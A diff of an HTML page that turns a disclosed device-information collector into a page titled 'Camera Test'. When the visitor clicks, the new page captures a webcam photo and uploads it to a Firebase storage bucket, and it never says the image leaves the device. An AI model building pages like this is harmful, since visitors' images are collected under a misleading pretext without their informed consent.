@@ -3,29 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Information Collector</title>
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore-compat.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-    .log {
-      margin-top: 20px;
-      color: red;
-      font-size: 14px;
-    }
-  </style>
+  <title>Camera Test</title>
 </head>
 <body>
-  <h1>Welcome!</h1>
-  <p>Your device information is being collected for analysis. Thank you!</p>
-
-  <div class="log" id="log"></div>
-
+  <h1>Camera Test</h1>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <button id="capture">Capture Photo</button>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage.js"></script>
   <script>
     // Firebase configuration
     const firebaseConfig = {
@@ -35,41 +22,52 @@
       storageBucket: "device-info-d07e2.appspot.com",
       messagingSenderId: "554200654244",
       appId: "1:554200654244:web:3a186125b1196828772131",
-      measurementId: "G-XH1WS92TKD"
+      measurementId: "G-XH1WS92TKD",
     };
 
     // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
+    const app = firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    const storage = firebase.storage();
 
-    // Collect device information
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screen: {
-        width: window.screen.width,
-        height: window.screen.height,
-        colorDepth: window.screen.colorDepth
-      },
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timestamp: new Date().toISOString()
-    };
-
-    // Save device info to Firestore
-    db.collection("deviceInfo")
-      .add(deviceInfo)
-      .then(() => {
-        document.getElementById("log").innerText = "Device information saved successfully!";
+    // Access Camera
+    const video = document.getElementById('video');
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
       })
       .catch((error) => {
-        console.error("Error saving device information:", error);
-        document.getElementById("log").innerText =
-          "Error saving device information: " + error.message;
+        console.error('Error accessing camera:', error);
       });
 
-    // Log collected device info for debugging
-    console.log("Collected Device Info:", deviceInfo);
+    // Capture Photo and Save
+    const captureButton = document.getElementById('capture');
+    captureButton.addEventListener('click', () => {
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const photoRef = storage.ref(`photos/${Date.now()}.jpg`);
+        photoRef.put(blob)
+          .then((snapshot) => {
+            console.log('Photo uploaded successfully');
+            return snapshot.ref.getDownloadURL();
+          })
+          .then((url) => {
+            db.collection('photos').add({
+              photoURL: url,
+              timestamp: new Date(),
+            });
+            console.log('Photo URL saved to Firestore:', url);
+          })
+          .catch((error) => {
+            console.error('Error saving photo:', error);
+          });
+      }, 'image/jpeg');
+    });
   </script>
 </body>
 </html>
